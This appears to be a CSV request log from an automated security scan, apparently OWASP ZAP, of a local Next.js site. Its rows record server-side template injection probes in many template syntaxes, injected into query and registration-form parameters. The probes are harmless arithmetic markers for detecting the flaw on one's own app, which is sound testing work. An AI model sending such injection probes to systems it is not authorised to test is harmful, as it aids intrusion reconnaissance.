2077,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj+1459*5871+zj,200,OK,123,315,25931
2078,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%7B1359*6237%7Dzj,200,OK,169,303,3866
2079,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%7B%238295*7199%7Dzj,200,OK,227,327,71262
2080,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%7B3409*5265%7Dzj,200,OK,155,303,3842
2081,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%7B%7B3825*8856%7D%7Dzj,101,Switching Protocols,105,129,0
2082,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%7B%7B%3D7699*2524%7D%7Dzj,200,OK,265,342,142828
2083,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%7B%7B%3D5681*2681%7D%7Dzj,101,Switching Protocols,11,129,0
2084,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/about?_rsc=zj%24%7B8956*9035%7Dzj,200,OK,149,303,3854
2085,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%24%7B2083*8475%7Dzj,200,OK,123,303,3866
2086,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%3C%25%3D9746*5376%25%3Ezj,101,Switching Protocols,76,129,0
2087,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/images,404,Not Found,316,341,9946
2088,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%7B4668*6178%7Dzj,200,OK,197,315,25931
2089,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%24%7B2541*1702%7Dzj,200,OK,137,303,3842
2090,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%23set%28%24x%3D9376*3260%29%24%7Bx%7Dzj,101,Switching Protocols,63,129,0
2091,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/about?_rsc=zj%23%7B4321*9199%7Dzj,200,OK,157,303,3854
2092,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%23%7B6919*9515%7Dzj,200,OK,157,303,3866
2093,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%7B%405533*6887%7Dzj,200,OK,284,327,71262
2094,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%3Cp+th%3Atext%3D%22%24%7B7478*7351%7D%22%3E%3C%2Fp%3Ezj,101,Switching Protocols,99,129,0
2095,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%24%7B8668*4233%7Dzj,200,OK,143,315,25931
2096,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%23%7B8544*6219%7Dzj,200,OK,131,303,3842
2097,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%7B%40math+key%3D%222288%22+method%3D%22multiply%22+operand%3D%229275%22%2F%7Dzj,101,Switching Protocols,35,129,0
2098,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/login?_rsc=zj+4804*3385+zj,200,OK,141,303,3854
2099,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/about?_rsc=zj%7B%238803*4054%7Dzj,200,OK,176,303,3854
2100,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%7B%239216*5671%7Dzj,200,OK,160,303,3866
2101,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%7B%7B54830%7Cadd%3A69460%7D%7Dzj,101,Switching Protocols,121,129,0
2102,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%3C%25%3D7590*5269%25%3Ezj,200,OK,426,342,142828
2103,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/webpack-hmr?id=zj%7B%7Bprint+%223181%22+%229483%22%7D%7Dzj,101,Switching Protocols,29,129,0
2104,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%7B%233707*9170%7Dzj,200,OK,179,303,3842
2105,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%23%7B4816*2508%7Dzj,200,OK,210,315,25931
2106,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/login?_rsc=zj%7B6741*2100%7Dzj,200,OK,183,303,3854
2107,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/about?_rsc=zj%7B%407839*4797%7Dzj,200,OK,148,303,3854
2108,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%7B%406780*6454%7Dzj,200,OK,150,303,3866
2109,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj+1242*7515+zj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,376,335,18923
2110,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%7B%7B7589*5198%7D%7Dzj,200,OK,313,327,71262
2111,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%7B%405300*5988%7Dzj,200,OK,128,303,3842
2112,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/login?_rsc=zj%24%7B2967*7309%7Dzj,200,OK,125,303,3854
2113,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/about?_rsc=zj%7B%7B9402*3648%7D%7Dzj,200,OK,124,303,3854
2114,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:21 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%7B%7B1836*7347%7D%7Dzj,200,OK,119,303,3866
2115,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%7B%234067*9367%7Dzj,200,OK,265,315,25931
2116,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%23set%28%24x%3D5681*8800%29%24%7Bx%7Dzj,200,OK,305,342,142828
2117,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%7B%7B4643*4398%7D%7Dzj,200,OK,172,303,3842
2118,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/login?_rsc=zj%23%7B3985*5171%7Dzj,200,OK,172,303,3854
2119,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/about?_rsc=zj%7B%7B%3D7743*4277%7D%7Dzj,200,OK,174,303,3854
2120,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%7B%7B%3D2733*8750%7D%7Dzj,200,OK,172,303,3866
2121,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%7B4024*6334%7Dzj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,297,335,18927
2122,Fri Sep 25 14:41:21 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%7B%7B%3D9268*6344%7D%7Dzj,200,OK,296,327,71262
2123,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%7B%402889*4358%7Dzj,200,OK,128,315,25931
2124,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%7B%7B%3D3896*7849%7D%7Dzj,200,OK,123,303,3842
2125,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/login?_rsc=zj%7B%236414*1242%7Dzj,200,OK,121,303,3854
2126,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/about?_rsc=zj%3C%25%3D5574*3768%25%3Ezj,200,OK,121,303,3854
2127,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%3C%25%3D6787*5989%25%3Ezj,200,OK,122,303,3866
2128,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%3C%25%3D5582*3946%25%3Ezj,200,OK,164,303,3842
2129,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%3Cp+th%3Atext%3D%22%24%7B4356*4818%7D%22%3E%3C%2Fp%3Ezj,200,OK,319,342,142828
2130,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%7B%7B6418*4779%7D%7Dzj,200,OK,195,315,25931
2131,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/login?_rsc=zj%7B%404106*9483%7Dzj,200,OK,168,303,3854
2132,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/about?_rsc=zj%23set%28%24x%3D3318*7297%29%24%7Bx%7Dzj,200,OK,172,303,3854
2133,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%23set%28%24x%3D3368*2068%29%24%7Bx%7Dzj,200,OK,169,303,3866
2134,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%24%7B9009*6405%7Dzj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,286,335,18935
2135,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%3C%25%3D4183*7609%25%3Ezj,200,OK,296,327,71262
2136,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%23set%28%24x%3D2832*7530%29%24%7Bx%7Dzj,200,OK,127,303,3842
2137,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/login?_rsc=zj%7B%7B8330*7754%7D%7Dzj,200,OK,127,303,3854
2138,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%3Cp+th%3Atext%3D%22%24%7B9564*4631%7D%22%3E%3C%2Fp%3Ezj,200,OK,111,303,3866
2139,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/about?_rsc=zj%3Cp+th%3Atext%3D%22%24%7B6384*6791%7D%22%3E%3C%2Fp%3Ezj,200,OK,166,303,3854
2140,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%7B%7B%3D3134*7409%7D%7Dzj,200,OK,272,315,25931
2141,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%3Cp+th%3Atext%3D%22%24%7B2033*9339%7D%22%3E%3C%2Fp%3Ezj,200,OK,184,303,3842
2142,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/login?_rsc=zj%7B%7B%3D5438*8429%7D%7Dzj,200,OK,179,303,3854
2143,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%7B%40math+key%3D%225440%22+method%3D%22multiply%22+operand%3D%228760%22%2F%7Dzj,200,OK,170,303,3866
2144,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/about?_rsc=zj%7B%40math+key%3D%224026%22+method%3D%22multiply%22+operand%3D%229650%22%2F%7Dzj,200,OK,172,303,3854
2145,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%23%7B3319*1881%7Dzj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,311,335,18935
2146,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%7B%40math+key%3D%221424%22+method%3D%22multiply%22+operand%3D%224992%22%2F%7Dzj,200,OK,400,342,142828
2147,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%23set%28%24x%3D8287*9231%29%24%7Bx%7Dzj,200,OK,311,327,71262
2148,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%3C%25%3D2676*6062%25%3Ezj,200,OK,136,315,25931
2149,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%7B%40math+key%3D%226965%22+method%3D%22multiply%22+operand%3D%229263%22%2F%7Dzj,200,OK,129,303,3842
2150,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/login?_rsc=zj%3C%25%3D5721*7691%25%3Ezj,200,OK,127,303,3854
2151,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%7B%7B98710%7Cadd%3A49400%7D%7Dzj,200,OK,124,303,3866
2152,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/about?_rsc=zj%7B%7B62060%7Cadd%3A15180%7D%7Dzj,200,OK,119,303,3854
2153,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%7B%7B56790%7Cadd%3A30440%7D%7Dzj,200,OK,161,303,3842
2154,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%23set%28%24x%3D5912*1144%29%24%7Bx%7Dzj,200,OK,189,315,25931
2155,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/login?_rsc=zj%23set%28%24x%3D1694*7136%29%24%7Bx%7Dzj,200,OK,163,303,3854
2156,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:22 IST 2026,GET,http://localhost:3000/contact?_rsc=zj%7B%7Bprint+%224834%22+%228469%22%7D%7Dzj,200,OK,164,303,3866
2157,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/about?_rsc=zj%7B%7Bprint+%228548%22+%224536%22%7D%7Dzj,200,OK,163,303,3854
2158,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%7B%238743*9820%7Dzj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,284,335,18935
2159,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%7B%7B12520%7Cadd%3A46390%7D%7Dzj,200,OK,294,342,142828
2160,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%3Cp+th%3Atext%3D%22%24%7B7675*9527%7D%22%3E%3C%2Fp%3Ezj,200,OK,287,327,71262
2161,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/faq?_rsc=zj%7B%7Bprint+%228035%22+%223630%22%7D%7Dzj,200,OK,128,303,3842
2162,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/login?_rsc=zj%3Cp+th%3Atext%3D%22%24%7B9162*6924%7D%22%3E%3C%2Fp%3Ezj,200,OK,126,303,3854
2163,Fri Sep 25 14:41:22 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%3Cp+th%3Atext%3D%22%24%7B1807*6966%7D%22%3E%3C%2Fp%3Ezj,200,OK,225,315,25931
2164,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/login?_rsc=zj%7B%40math+key%3D%225340%22+method%3D%22multiply%22+operand%3D%226308%22%2F%7Dzj,200,OK,101,303,3854
2165,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%7B%403926*7230%7Dzj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,176,335,18935
2166,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%7B%40math+key%3D%227786%22+method%3D%22multiply%22+operand%3D%221709%22%2F%7Dzj,200,OK,174,327,71262
2167,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/_next/static/chunks/webpack.js?v=zj%7B%7Bprint+%229852%22+%225494%22%7D%7Dzj,200,OK,176,342,142828
2168,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%7B%40math+key%3D%222426%22+method%3D%22multiply%22+operand%3D%228787%22%2F%7Dzj,200,OK,47,315,25931
2169,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/login?_rsc=zj%7B%7B70290%7Cadd%3A82980%7D%7Dzj,200,OK,44,303,3854
2170,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/login?_rsc=zj%7B%7Bprint+%225230%22+%223121%22%7D%7Dzj,200,OK,89,303,3854
2171,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%7B%7B76100%7Cadd%3A12640%7D%7Dzj,200,OK,121,315,25931
2172,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%7B%7B4792*7730%7D%7Dzj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,139,335,18943
2173,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%7B%7B12350%7Cadd%3A70590%7D%7Dzj,200,OK,132,327,71262
2174,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/favicon.ico?603d046c9a6fdfbb=zj%7B%7Bprint+%221948%22+%229808%22%7D%7Dzj,200,OK,56,315,25931
2175,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%7B%7B%3D8317*3221%7D%7Dzj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,63,335,18951
2176,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/_next/static/css/app/layout.css?v=zj%7B%7Bprint+%224496%22+%224596%22%7D%7Dzj,200,OK,63,327,71262
2177,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%3C%25%3D4284*2400%25%3Ezj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,53,335,18971
2178,Fri Sep 25 14:41:20 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=zj%7B1167*5498%7Dzj,200,OK,2637,345,11938274
2179,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%23set%28%24x%3D2053*5309%29%24%7Bx%7Dzj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,68,335,18991
2180,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:23 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%3Cp+th%3Atext%3D%22%24%7B4111*8698%7D%22%3E%3C%2Fp%3Ezj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,58,335,19105
2181,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:24 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%7B%40math+key%3D%226952%22+method%3D%22multiply%22+operand%3D%223756%22%2F%7Dzj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,57,335,19201
2182,Fri Sep 25 14:41:24 IST 2026,Fri Sep 25 14:41:24 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%7B%7B28760%7Cadd%3A27670%7D%7Dzj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,58,335,18975
2183,Fri Sep 25 14:41:24 IST 2026,Fri Sep 25 14:41:24 IST 2026,GET,http://localhost:3000/register?confirmPassword=zj%7B%7Bprint+%222301%22+%226914%22%7D%7Dzj&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,53,335,19043
2184,Fri Sep 25 14:41:23 IST 2026,Fri Sep 25 14:41:24 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=zj%24%7B8696*3430%7Dzj,200,OK,271,345,11938274
2185,Fri Sep 25 14:41:24 IST 2026,Fri Sep 25 14:41:24 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj+4631*6050+zj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,64,335,18855
2186,Fri Sep 25 14:41:24 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%7B4619*2404%7Dzj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,68,335,18859
2187,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%24%7B7906*6289%7Dzj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,55,335,18867
2188,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%23%7B7889*6748%7Dzj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,62,335,18867
2189,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%7B%232672*6120%7Dzj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,92,335,18867
2190,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%7B%407558*8869%7Dzj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,66,335,18867
2191,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%7B%7B6885*5357%7D%7Dzj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,60,335,18875
2192,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%7B%7B%3D7818*3798%7D%7Dzj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,69,335,18883
2193,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%3C%25%3D6724*9333%25%3Ezj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,59,335,18903
2194,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%23set%28%24x%3D1637*7853%29%24%7Bx%7Dzj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,74,335,18923
2195,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%3Cp+th%3Atext%3D%22%24%7B1892*5958%7D%22%3E%3C%2Fp%3Ezj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,63,335,19037
2196,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%7B%40math+key%3D%223291%22+method%3D%22multiply%22+operand%3D%223199%22%2F%7Dzj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,72,335,19133
2197,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%7B%7B23210%7Cadd%3A46170%7D%7Dzj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,78,335,18907
2198,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zj%7B%7Bprint+%229587%22+%228981%22%7D%7Dzj&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,74,335,18975
2199,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=zj+5916*8703+zj&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,84,335,18907
2200,Fri Sep 25 14:41:25 IST 2026,Fri Sep 25 14:41:25 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com&membershipType=zj%7B9568*5744%7Dzj&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,59,335,18911
